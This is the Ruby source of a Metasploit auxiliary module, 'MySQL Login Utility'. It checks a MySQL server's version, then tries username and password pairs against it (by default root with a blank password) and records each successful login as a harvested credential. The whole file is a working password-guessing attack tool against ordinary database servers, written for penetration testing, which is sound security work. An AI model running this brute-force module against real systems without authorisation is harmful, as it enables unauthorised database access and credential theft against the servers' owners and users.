##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::MYSQL
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::AuthBrute

	include Msf::Auxiliary::Scanner

	def initialize(info = {})
		super(update_info(info,
			'Name'			=> 'MySQL Login Utility',
			'Description'	=> 'This module simply queries the MySQL instance for a specific user/pass (default is root with blank).',
			'Author'		=> [ 'Bernardo Damele A. G. <bernardo.damele[at]gmail.com>' ],
			'License'		=> MSF_LICENSE,
			'References'     =>
				[
					[ 'CVE', '1999-0502'] # Weak password
				]
		))
	end

	def target
		[rhost,rport].join(":")
	end


	def run_host(ip)
		begin
			if mysql_version_check("4.1.1") # Pushing down to 4.1.1.
				each_user_pass { |user, pass|
					do_login(user, pass)
				}
			else
				print_error "#{target} - Unsupported target version of MySQL detected. Skipping."
			end
		rescue ::Rex::ConnectionError, ::EOFError => e
			print_error "#{target} - Unable to connect: #{e.to_s}"
		end
	end

	# Tmtm's rbmysql is only good for recent versions of mysql, according
	# to http://www.tmtm.org/en/mysql/ruby/. We'll need to write our own
	# auth checker for earlier versions. Shouldn't be too hard.
	# This code is essentially the same as the mysql_version module, just less
	# whitespace and returns false on errors.
	def mysql_version_check(target="5.0.67") # Oldest the library claims.
		begin
			s = connect(false)
			data = s.get
			disconnect(s)
		rescue ::Rex::ConnectionError, ::EOFError => e
			raise e
		rescue ::Exception => e
			vprint_error("#{rhost}:#{rport} error checking version #{e.class} #{e}")
			return false
		end
		offset = 0
		l0, l1, l2 = data[offset, 3].unpack('CCC')
		return false if data.length < 3
		length = l0 | (l1 << 8) | (l2 << 16)
		# Read a bad amount of data
		return if length != (data.length - 4)
		offset += 4
		proto = data[offset, 1].unpack('C')[0]
		# Error condition
		return if proto == 255
		offset += 1
		version = data[offset..-1].unpack('Z*')[0]
		report_service(:host => rhost, :port => rport, :name => "mysql", :info => version)
		short_version = version.split('-')[0]
		vprint_status "#{rhost}:#{rport} - Found remote MySQL version #{short_version}"
		int_version(short_version) >= int_version(target)
	end

	# Takes a x.y.z version number and turns it into an integer for
	# easier comparison. Useful for other things probably so should
	# get moved up to Rex. Allows for version increments up to 0xff.
	def int_version(str)
		int = 0
		begin # Okay, if you're not exactly what I expect, just return 0
			return 0 unless str =~ /^[0-9]+\x2e[0-9]+/
			digits = str.split(".")[0,3].map {|x| x.to_i}
			digits[2] ||= 0 # Nil protection
			int =  (digits[0] << 16)
			int += (digits[1] << 8)
			int += digits[2]
		rescue
			return int
		end
	end

	def do_login(user='', pass='')

		vprint_status("#{rhost}:#{rport} Trying username:'#{user}' with password:'#{pass}'")
		begin
			m = mysql_login(user, pass)
			return :fail if not m

			print_good("#{rhost}:#{rport} - SUCCESSFUL LOGIN '#{user}' : '#{pass}'")
			report_auth_info(
				:host   => rhost,
				:port   => rport,
				:sname  => 'mysql',
				:user   => user,
				:pass   => pass,
				:source_type => "user_supplied",
				:active => true
			)
			return :next_user

		rescue ::RbMysql::Error => e
			vprint_error("#{rhost}:#{rport} failed to login: #{e.class} #{e}")
			return :error

		rescue ::Interrupt
			raise $!

		rescue ::Rex::ConnectionError
			return :abort

		end
	end

end
